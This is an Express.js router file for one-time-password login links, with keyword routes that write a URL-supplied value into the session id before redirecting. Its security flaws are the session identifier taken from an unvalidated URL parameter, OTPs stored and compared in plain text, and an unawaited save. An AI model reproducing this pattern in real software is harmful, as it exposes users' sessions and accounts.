const {Router}=require('express');
const User=require('../services/user');
const asyncHandler=require('express-async-handler');

const router = new Router();

router.get('/:id/:OTP',asyncHandler(async function (req,res){
    const{id,OTP}=req.params;
    if(id=='update'){
        req.session.id=OTP;
        return res.redirect('/update');
    }
    if(id=='authentication'){
        req.session.id=OTP;
        return res.redirect('/authentication');
    }
    if(id=='works_again'){
        req.session.id=OTP;
        return res.redirect('/works_again');
    }
    if(id=='locked'){
        req.session.id=OTP;
        return res.redirect('/locked');
    }
    if(id=='accept'){
        req.session.id=OTP;
        return res.redirect('/accept');
    }
    if(id=='refuse'){
        req.session.id=OTP;
        return res.redirect('/refuse');
    }
    if(id=='information'){
        req.session.id=OTP;
        return res.redirect('/information');
    }
    const user=await User.findById(id);
    if(user && user.OTP === OTP){
        user.OTP=null;
        user.save();
        req.session.userId=user.id;
        return res.redirect('/customer');
    }
    else{
        return res.render('/login_OTP_err');
    }    
}));

module.exports = router;